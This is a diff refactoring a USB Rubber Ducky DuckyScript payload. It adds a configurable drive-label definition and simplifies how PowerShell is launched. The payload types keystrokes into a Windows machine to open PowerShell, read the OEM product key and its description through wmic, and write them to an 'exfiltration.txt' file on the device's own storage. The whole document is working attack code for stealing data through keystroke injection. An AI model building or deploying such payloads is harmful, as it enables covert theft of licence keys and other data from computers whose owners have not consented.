@@ -21,6 +21,14 @@ END_REM
 DEFINE #USB_RUBBER_DUCKY_STORAGE TRUE
 
 
+REM_BLOCK
+This definition allows the drive label to be parameterized dynamically.
+Instead of hardcoding the "DUCKY" label throughout the script, we use a defined variable at the beginning that can be easily adjusted.
+This way, if the drive label changes or needs to be customized for different environments, you only need to update this definition without altering multiple instances in the code. It’s an approach that enhances the script's flexibility and maintainability.
+END_REM
+DEFINE #DUCKY_DRIVE_LABEL DUCKY
+
+
 EXTENSION DETECT_READY
     REM VERSION 1.1
     REM AUTHOR: Korben
@@ -51,15 +59,14 @@ END_EXTENSION
 
 GUI r
 DELAY 1000
-STRING powershell
-ENTER
+STRINGLN powershell
 DELAY 2000
 
 STRINGLN $key_detected=$(wmic path softwarelicensingservice get OA3xOriginalProductKey)+$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription);
 
 IF_DEFINED_TRUE #USB_RUBBER_DUCKY_STORAGE
     STRINGLN
-        $m=(Get-Volume -FileSystemLabel 'DUCK').DriveLetter;
+        $m=(Get-Volume -FileSystemLabel '#DUCKY_DRIVE_LABEL').DriveLetter;
         echo $key_detected >> ${m}:\exfiltration.txt
     END_STRINGLN
 END_IF_DEFINED
